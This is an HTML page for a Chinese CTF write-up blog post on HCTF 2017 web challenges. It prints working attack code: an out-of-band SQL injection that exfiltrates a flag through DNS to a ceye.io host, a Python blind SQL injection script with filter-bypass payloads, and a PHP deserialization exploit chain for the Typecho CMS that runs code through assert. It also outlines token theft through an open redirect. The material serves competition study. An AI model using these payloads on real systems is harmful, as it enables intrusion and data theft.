@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>hctf2017 web writeup | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="ctf,writeup,">
+  
+
+  <meta name="description" content="Level-1easy_sign_in登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。  Level-2boring website用我自己写的扫源码神器biubiubiu扫出http://106.15.53.124:38324/www.zip 之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hctf2017 web writeup">
+<meta property="og:url" content="http://hebic.me/2017/11/13/hctf2017-web-writeup/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="Level-1easy_sign_in登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。  Level-2boring website用我自己写的扫源码神器biubiubiu扫出http://106.15.53.124:38324/www.zip 之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://hebic.me/2017/11/13/hctf2017-web-writeup/1.png">
+<meta property="og:updated_time" content="2017-11-15T11:20:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hctf2017 web writeup">
+<meta name="twitter:description" content="Level-1easy_sign_in登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。  Level-2boring website用我自己写的扫源码神器biubiubiu扫出http://106.15.53.124:38324/www.zip 之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用">
+<meta name="twitter:image" content="http://hebic.me/2017/11/13/hctf2017-web-writeup/1.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-1"><span class="toc-text">Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-sign-in"><span class="toc-text">easy_sign_in</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-2"><span class="toc-text">Level-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#boring-website"><span class="toc-text">boring website</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Level-3"><span class="toc-text">Level-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Sliencer"><span class="toc-text">SQL Sliencer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-World-Restored"><span class="toc-text">A World Restored</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-hctf2017-web-writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">hctf2017 web writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.11.13</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/11/13/hctf2017-web-writeup/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h1><h2 id="easy-sign-in"><a href="#easy-sign-in" class="headerlink" title="easy_sign_in"></a>easy_sign_in</h2><p>登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。</p>
+<p><img src="/2017/11/13/hctf2017-web-writeup/1.png" alt="1"></p>
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h1><h2 id="boring-website"><a href="#boring-website" class="headerlink" title="boring website"></a>boring website</h2><p>用我自己写的扫源码神器biubiubiu扫出<a href="http://106.15.53.124:38324/www.zip" target="_blank" rel="noopener">http://106.15.53.124:38324/www.zip</a></p>
+<p>之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用openquery函数，利用mssql连接MySQL，再用mysql的oob得到数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.15.53.124:38324/?id=1;select * from openquery(mysql,&apos;select load_file(concat(&quot;\\\\&quot;,(select password from webwebweb.secret where name=&quot;flag&quot; limit 0,1),&quot;.ikyzvu.ceye.io\\1.txt&quot;));&apos;)</span><br></pre></td></tr></table></figure>
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h1><h2 id="SQL-Sliencer"><a href="#SQL-Sliencer" class="headerlink" title="SQL Sliencer"></a>SQL Sliencer</h2><p>注入就是纯粹的注入。</p>
+<p>这题在结束后得知有三种做法：</p>
+<ol>
+<li>常规方法是盲注：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(bg,ed,num)</span>:</span></span><br><span class="line">	guess = (bg+ed)/<span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> ed-bg==<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> chr(guess+<span class="number">1</span>)</span><br><span class="line">	url = <span class="string">"http://sqls.2017.hctf.io/index/index.php?id=2/(select(case%0awhen%0aascii(substr((select(flag)from(flag)where%0aflag%0anot%0alike%0aunhex(256125))%0afrom%0a"</span>+str(num)+<span class="string">"))&gt;"</span>+str(guess)+<span class="string">"%0athen%0a1%0aelse%0a0%0aend))"</span></span><br><span class="line">	<span class="keyword">print</span> url</span><br><span class="line">	request = requests.get(url).text</span><br><span class="line">	<span class="keyword">if</span> request.find(<span class="string">"error"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> sql(bg,guess,num)</span><br><span class="line">	<span class="keyword">elif</span> request.find(<span class="string">"Bob"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> sql(guess,ed,num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	flag += sql(<span class="number">10</span>,<span class="number">140</span>,i)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>得益于刘师傅教的最小二分法，40多位的flag两分钟左右就能跑出来。</p>
+<ol start="2">
+<li>先定义变量后拼接绕开union all select xxx from，将select xxx from定义到变量中，后拼接到union后。</li>
+<li>preg_match的超长字符绕过，这道题传参用的GET，服务器接不了那么大的数据就reset了。</li>
+</ol>
+<p>得到flag：./H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/ 是一个地址，里面有一个typecho，前段时间的getshell。用scandir读目录，用file_get_contents读flag。</p>
+<p>exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS1 = <span class="string">'RSS 1.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">'r'</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">'c'</span>;</span><br><span class="line">    <span class="keyword">const</span> EOL = <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'title'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'link'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'date'</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'var_dump(file_get_contents("/flag_is_here/flag"))'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure>
+<h2 id="A-World-Restored"><a href="#A-World-Restored" class="headerlink" title="A World Restored"></a>A World Restored</h2><p>这道题比赛中没有做出来，看了柠檬叔叔的wp，原来只差最后一步。</p>
+<p>比赛环境已经关掉了，凭记忆写一点。</p>
+<p>这道题的环境开着CSP，在default-src部署了nonce，nonce是必须脚本待着nonce-xxxxx才可以执行的一种白名单机制，由于每一次nonce都不一样，所以注入进的script标签无法猜测nonce导致无法执行。</p>
+<p>这道题有两个域名：</p>
+<p><a href="http://messbox.2017.hctf.io/" target="_blank" rel="noopener">http://messbox.2017.hctf.io/</a> 和 <a href="http://auth.2017.hctf.io/" target="_blank" rel="noopener">http://auth.2017.hctf.io/</a> ，后者为身份认证平台，分发token，利用token登陆。这道题目的考点是，登陆验证是用token验证。如果获得管理员token就可以利用管理员身份登陆。在输入用户名密码之后会进入，auth会利用js的location跳转到messbox，url大致是：<a href="http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php&amp;token=xxxxxx" target="_blank" rel="noopener">http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php&amp;token=xxxxxx</a> 由于n_url可控，所以把n_url替换成自己的网址，发给管理员。管理员必然有token。</p>
+<p>getflag</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/11/06/SWPU2017-web300-writeup/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/04/20/DDCTF2018-mini-blockchain-writeup/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/11/13/hctf2017-web-writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
